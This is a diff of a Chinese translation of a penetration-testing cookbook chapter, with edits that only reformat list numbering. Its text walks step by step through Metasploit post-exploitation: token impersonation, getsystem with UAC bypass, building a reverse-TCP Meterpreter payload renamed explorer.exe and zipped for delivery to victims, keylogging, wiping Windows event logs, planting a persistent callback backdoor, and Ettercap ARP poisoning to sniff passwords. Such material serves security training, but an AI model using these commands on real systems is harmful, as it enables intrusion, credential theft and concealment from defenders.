@@ -24,23 +24,23 @@
 
 下面是具体步骤：
 
-1.  我们可以在 Meterpreter 使用`incognito`来开始模拟过程：
+1.我们可以在 Meterpreter 使用`incognito`来开始模拟过程：
 
 ```
 use incognito
 ```
 
-2.  展示`incognito`的帮助文档，通过输入`help`命令：
+2.展示`incognito`的帮助文档，通过输入`help`命令：
 
 ```
 help
 ```
 
-3.  你会注意到我们有几个可用的选项：
+3.你会注意到我们有几个可用的选项：
 
 ![](img/7-1-2.jpg)
 
-4.  下面我们打算获得可用用户的列表，这些用户当前登入了系统，或者最近访问过系统。我们可以通过以`-u`执行`list_tokens`命令来完成它。
+4.下面我们打算获得可用用户的列表，这些用户当前登入了系统，或者最近访问过系统。我们可以通过以`-u`执行`list_tokens`命令来完成它。
 
 ```
 list_tokens –u
@@ -48,13 +48,13 @@ list_tokens –u
 
 ![](img/7-1-3.jpg)
 
-5.  下面，我们执行模拟攻击。语法是`impersonate_token [name of the account to impersonate]`。
+5.下面，我们执行模拟攻击。语法是`impersonate_token [name of the account to impersonate]`。
 
 ```
 impersonate_token \\willie-pc\willie 
 ```
 
-6.  最后，我们选择一个 shell 命令来运行。如果我们成功了，我们就以另一个用户的身份在使用当前系统。
+6.最后，我们选择一个 shell 命令来运行。如果我们成功了，我们就以另一个用户的身份在使用当前系统。
 
 #### 工作原理
 
@@ -76,17 +76,17 @@ impersonate_token \\willie-pc\willie
 
 让我们在 Meterpreter shell 中开始执行本地提权攻击。你需要使用 Metasploit 攻击某个主机来获得 Meterpreter shell。你可以使用第六章的秘籍之一，来通过 Metasploit 获得主机的访问。
 
-1.  一旦你通过 Metasploit 和 Meterpreter shell 获得了受害者的访问权限，等待你的 Meterpreter 显示提示符。
+1.一旦你通过 Metasploit 和 Meterpreter shell 获得了受害者的访问权限，等待你的 Meterpreter 显示提示符。
 
 ![](img/7-2-1.jpg)
 
-2.  下面，使用`-h`选项查看`getsystem `的帮助文件：
+2.下面，使用`-h`选项查看`getsystem `的帮助文件：
 
 ```
 getsystem –h
 ```
 
-3.  最后我们不带任何选项来运行`getsystem`：
+3.最后我们不带任何选项来运行`getsystem`：
 
 ```
 getsystem
@@ -94,9 +94,9 @@ getsystem
 
 > 如果你尝试获得 Windows 7 主机的访问，你必须在执行`getsystem`命令之前执行`bypassuac `。`bypassuac `允许你绕过[微软的用户账户控制](http://windows.microsoft.com/en-us/windows7/products/ features/user-account-control)。这个命令这样运行：`run post/windows/escalate/bypassuac`。
 
-4.  下面，我们执行最后的命令来获取访问。
+4.下面，我们执行最后的命令来获取访问。
 
-5.  这就结束了。我们已经成功进行了提权攻击。
+5.这就结束了。我们已经成功进行了提权攻击。
 
 #### 工作原理
 
@@ -110,13 +110,13 @@ getsystem
 
 掌握 SET 的步骤如下所示。
 
-1.  打开终端窗口，通过按下终端图标，并访问 SET 所在的目录：
+1.打开终端窗口，通过按下终端图标，并访问 SET 所在的目录：
 
 ```
 se-toolkit
 ```
 
-2.  完成之后，你会看到 SET 菜单。SET 菜单有如下选项：
+2.完成之后，你会看到 SET 菜单。SET 菜单有如下选项：
 
 
 + Social-Engineering Attacks （社会工程攻击）
@@ -134,13 +134,13 @@ se-toolkit
 
 ![](img/7-3-1.jpg)
 
-3.  出于我们的目的，我们选择第一个选项来开始社会工程攻击：
+3.出于我们的目的，我们选择第一个选项来开始社会工程攻击：
 
 ```
 1
 ```
 
-4.  我们现在会看到社会工程攻击的列表，它们展示在下面的截图中。出于我们的目的，我们使用` Create a Payload and Listener`（创建载荷和监听器，选项 4）。
+4.我们现在会看到社会工程攻击的列表，它们展示在下面的截图中。出于我们的目的，我们使用` Create a Payload and Listener`（创建载荷和监听器，选项 4）。
 
 ```
 4
@@ -148,7 +148,7 @@ se-toolkit
 
 ![](img/7-3-2.jpg)
 
-5.  下面，我们被询问输入载荷的 IP 来反转链接。这里，我们输入我们的 IP 地址：
+5.下面，我们被询问输入载荷的 IP 来反转链接。这里，我们输入我们的 IP 地址：
 
 ```
 192.168.10.109
@@ -156,7 +156,7 @@ se-toolkit
 
 ![](img/7-3-3.jpg)
 
-6.  你会看到载荷的列表和描述，它们为`Payload and Listener`选项生成。选择`Windows Reverse_TCP Meterpreter`。这会让我们连接到目标上，并对其执行 Meterpreter 载荷。
+6.你会看到载荷的列表和描述，它们为`Payload and Listener`选项生成。选择`Windows Reverse_TCP Meterpreter`。这会让我们连接到目标上，并对其执行 Meterpreter 载荷。
 
 ```
 2
@@ -164,17 +164,17 @@ se-toolkit
 
 ![](img/7-3-4.jpg)
 
-7.  最后，我们被询问作为监听器端口的端口号。已经为你选择了 443，所以我们就选择它了。
+7.最后，我们被询问作为监听器端口的端口号。已经为你选择了 443，所以我们就选择它了。
 
 ```
 443
 ```
 
-8.  一旦载荷准备完毕，你会被询问来启动监听器，输入`Yes`：
+8.一旦载荷准备完毕，你会被询问来启动监听器，输入`Yes`：
 
 ![](img/7-3-5.jpg)
 
-9.  你会注意到 Metasploit 打开了一个处理器。
+9.你会注意到 Metasploit 打开了一个处理器。
 
 ![](img/7-3-6.jpg)
 
@@ -190,19 +190,19 @@ se-toolkit
 
 下面的步骤会将你的载荷传给受害者。
 
-1.  在 SET 目录下，你胡注意到有个 EXE 文件叫做`msf.exe`。推荐你将文件名称修改为不会引起怀疑的名称。这里，我们将它改为`explorer.exe`。最开始，我们打开终端窗口并访问 SET 所在的目录。
+1.在 SET 目录下，你胡注意到有个 EXE 文件叫做`msf.exe`。推荐你将文件名称修改为不会引起怀疑的名称。这里，我们将它改为`explorer.exe`。最开始，我们打开终端窗口并访问 SET 所在的目录。
 
 ```
 cd /usr/share/set 
 ```
 
-2.  之后我们获得目录中所有项目的列表。
+2.之后我们获得目录中所有项目的列表。
 
 ```
 ls
 ```
 
-3.  之后我们将这个文件重命名为`explorer.exe`：
+3.之后我们将这个文件重命名为`explorer.exe`：
 
 ```
 mv msf.exe explorer.exe
@@ -210,13 +210,13 @@ mv msf.exe explorer.exe
 
 ![](img/7-3-7.jpg)
 
-4.  现在我们压缩` explorer.exe`载荷。这里，ZIP 归档叫做`healthyfiles`。
+4.现在我们压缩` explorer.exe`载荷。这里，ZIP 归档叫做`healthyfiles`。
 
 ```
 zip healthyfiles explorer.exe 
 ```
 
-5.  既然你已经拥有了 ZIP 归档，你可以把文件以多种方式分发给受害者。你可以通过电子邮件来传递，也可以放进 U 盘并手动在受害者机器中打开，以及其它。探索这些机制会给你想要的结果来达成你的目标。
+5.既然你已经拥有了 ZIP 归档，你可以把文件以多种方式分发给受害者。你可以通过电子邮件来传递，也可以放进 U 盘并手动在受害者机器中打开，以及其它。探索这些机制会给你想要的结果来达成你的目标。
 
 ### 7.4 收集受害者数据
 
@@ -234,11 +234,11 @@ zip healthyfiles explorer.exe
 
 让我们开始通过 Meterpreter  shell 来收集受害者数据。你需要使用 Metasploit  攻击某个主机来获得  Meterpreter shell。你可以使用第六章的秘籍之一，来通过 Metasploit 获得目标主机的访问。
 
-1.  一旦你通过 Metasploit 和 Meterpreter shell 获得了受害者的访问权限，等待你的 Meterpreter 显示提示符。
+1.一旦你通过 Metasploit 和 Meterpreter shell 获得了受害者的访问权限，等待你的 Meterpreter 显示提示符。
 
 ![](img/7-4-1.jpg)
 
-2.  下面，我们执行下面的命令来开启键盘记录器：
+2.下面，我们执行下面的命令来开启键盘记录器：
 
 ```
 keyscan_start
@@ -246,7 +246,7 @@ keyscan_start
 
 ![](img/7-4-2.jpg)
 
-3.  最后，我们输入` keyscan_dump`命令，将用户的击键顺序输出到屏幕上。
+3.最后，我们输入` keyscan_dump`命令，将用户的击键顺序输出到屏幕上。
 
 ```
 keyscan_dump
@@ -278,11 +278,11 @@ keyscan_dump
 
 需要执行步骤如下所示：
 
-1.  让我们开始使用  Meterpreter shell 来清理我们的踪迹。你需要使用 Metasploit  攻击某个主机来获得  Meterpreter shell。你可以使用第六章的秘籍之一，来通过 Metasploit 获得目标主机的访问。一旦你通过 Metasploit 和 Meterpreter shell 获得了受害者的访问权限，等待你的 Meterpreter 显示提示符。
+1.让我们开始使用  Meterpreter shell 来清理我们的踪迹。你需要使用 Metasploit  攻击某个主机来获得  Meterpreter shell。你可以使用第六章的秘籍之一，来通过 Metasploit 获得目标主机的访问。一旦你通过 Metasploit 和 Meterpreter shell 获得了受害者的访问权限，等待你的 Meterpreter 显示提示符。
 
 ![](img/7-5-1.jpg)
 
-2.  下面，我们需要运行 IRB，以便进行日志移除操作。我们打开帮助文件：
+2.下面，我们需要运行 IRB，以便进行日志移除操作。我们打开帮助文件：
 
 ```
 irb
@@ -290,7 +290,7 @@ irb
 
 ![](img/7-5-2.jpg)
 
-3.  下面，我们告诉 IRB 要移除哪个文件。下面是一个可用的选择：
+3.下面，我们告诉 IRB 要移除哪个文件。下面是一个可用的选择：
 
 ```
 log = client.sys.eventlog.open('system') 
@@ -301,7 +301,7 @@ log = client.sys.eventlog.open('dns server')
 log = client.sys.eventlog.open('file replication service')
 ```
 
-4.  出于我们的目的，我们把它们都清理掉。你需要将这些一次键入：
+4.出于我们的目的，我们把它们都清理掉。你需要将这些一次键入：
 
 ```
 log = client.sys.eventlog.open('system') 
@@ -312,13 +312,13 @@ log = client.sys.eventlog.open('dns server')
 log = client.sys.eventlog.open('file replication service')
 ```
 
-5.  现在我们执行命令来清理日志文件：
+5.现在我们执行命令来清理日志文件：
 
 ```
 Log.clear 
 ```
 
-6.  这就结束了。我们只用了这么少的命令就能清理我们的踪迹。
+6.这就结束了。我们只用了这么少的命令就能清理我们的踪迹。
 
 #### 工作原理
 
@@ -340,17 +340,17 @@ Log.clear
 
 让我们开始植入我们的永久后门。你需要使用 Metasploit  攻击某个主机来获得  Meterpreter shell。你可以使用第六章的秘籍之一，来通过 Metasploit 获得目标主机的访问。
 
-1.  一旦你通过 Metasploit 和 Meterpreter shell 获得了受害者的访问权限，等待你的 Meterpreter 显示提示符。
+1.一旦你通过 Metasploit 和 Meterpreter shell 获得了受害者的访问权限，等待你的 Meterpreter 显示提示符。
 
 ![](img/7-6-1.jpg)
 
-2.  下面，我们需要运行 persistence，以便创建我们的后门。我们打开帮助文件：
+2.下面，我们需要运行 persistence，以便创建我们的后门。我们打开帮助文件：
 
 ```
 run persistence –h 
 ```
 
-3.  永久后门有几个选项，包括：
+3.永久后门有几个选项，包括：
 
 +   `-A`：这个选项会自动启动一个匹配的多重处理器来链接到代理端。
 
@@ -366,13 +366,13 @@ run persistence –h
 
 +   `-r`：这个选项设置攻击者机器的 IP 地址。
 
-4.  现在，我们执行命令来建立后门：
+4.现在，我们执行命令来建立后门：
 
 ```
 run persistence –U –A –i 10 – 8090 –r 192.168.10.109
 ```
 
-5.  后门现在已经建立了。如果成功的话，你会注意到你有了第二个 Meterpreter  会话。
+5.后门现在已经建立了。如果成功的话，你会注意到你有了第二个 Meterpreter  会话。
 
 ![](img/7-6-2.jpg)
 
@@ -396,7 +396,7 @@ run persistence –U –A –i 10 – 8090 –r 192.168.10.109
 
 让我们启动 Ettercap 来开始中间人攻击。
 
-1.  打开终端窗口并启动 Ettercap。使用`-G`选项加载 GUI：
+1.打开终端窗口并启动 Ettercap。使用`-G`选项加载 GUI：
 
 ```
 ettercap –G
@@ -404,47 +404,47 @@ ettercap –G
 
 ![](img/7-7-1.jpg)
 
-2.  我们以打开` Unified sniffing`（统一嗅探）开始。你可以按下`Shift + U`或者访问菜单中的` Sniff | Unified sniffing`。
+2.我们以打开` Unified sniffing`（统一嗅探）开始。你可以按下`Shift + U`或者访问菜单中的` Sniff | Unified sniffing`。
 
 ![](img/7-7-2.jpg)
 
-3.  选择网络接口。在发起 MITM 攻击的情况中，我们应该选项我们的无线接口。
+3.选择网络接口。在发起 MITM 攻击的情况中，我们应该选项我们的无线接口。
 
 ![](img/7-7-3.jpg)
 
-4.  下面，我们打开`Scan for hosts`（扫描主机）。可以通过按下`Ctrl + S`或访问菜单栏的` Hosts | Scan for hosts`来完成。
+4.下面，我们打开`Scan for hosts`（扫描主机）。可以通过按下`Ctrl + S`或访问菜单栏的` Hosts | Scan for hosts`来完成。
 
 ![](img/7-7-4.jpg)
 
-5.  下面，我们得到了`Host List`（主机列表）。你可以按下`H`或者访问菜单栏的`Hosts | Host List`。
+5.下面，我们得到了`Host List`（主机列表）。你可以按下`H`或者访问菜单栏的`Hosts | Host List`。
 
 ![](img/7-7-5.jpg)
 
-6.  我们下面需要选择或设置我们的目标。在我们的例子中，我们选择`192.168.10.111`作为我们的`Target 1`，通过选中它的 IP 地址并按下` Add To Target 1 `（添加到目标 1）按钮。
+6.我们下面需要选择或设置我们的目标。在我们的例子中，我们选择`192.168.10.111`作为我们的`Target 1`，通过选中它的 IP 地址并按下` Add To Target 1 `（添加到目标 1）按钮。
 
 ![](img/7-7-6.jpg)
 
-7.  现在我们能够让 Ettercap 开始嗅探了。你可以按下`Ctrl + W`或访问菜单栏的` Start | Start sniffing`。
+7.现在我们能够让 Ettercap 开始嗅探了。你可以按下`Ctrl + W`或访问菜单栏的` Start | Start sniffing`。
 
 ![](img/7-7-7.jpg)
 
-8.  最后，我们开始进行 ARP 毒化。访问菜单栏的`Mitm | Arp poisoning`。
+8.最后，我们开始进行 ARP 毒化。访问菜单栏的`Mitm | Arp poisoning`。
 
 ![](img/7-7-8.jpg)
 
-9.  在出现的窗口中，选中` Sniff  remote connections`（嗅探远程连接）的选项。
+9.在出现的窗口中，选中` Sniff  remote connections`（嗅探远程连接）的选项。
 
 ![](img/7-7-9.jpg)
 
-0.  取决于网络环境，我们会看到信息。
+0.取决于网络环境，我们会看到信息。
 
 ![](img/7-7-10.jpg)
 
-1.  一旦我们找到了想要找的信息（用户名和密码）。我们可以关闭 Ettercap。你可以按下`Ctrl + E`或访问菜单栏的`Start | Stop sniffing`来完成它。
+1.一旦我们找到了想要找的信息（用户名和密码）。我们可以关闭 Ettercap。你可以按下`Ctrl + E`或访问菜单栏的`Start | Stop sniffing`来完成它。
 
 ![](img/7-7-11.jpg)
 
-2.  现在我们关闭 ARP 毒化，使网络恢复正常。
+2.现在我们关闭 ARP 毒化，使网络恢复正常。
 
 ![](img/7-7-12.jpg)
 
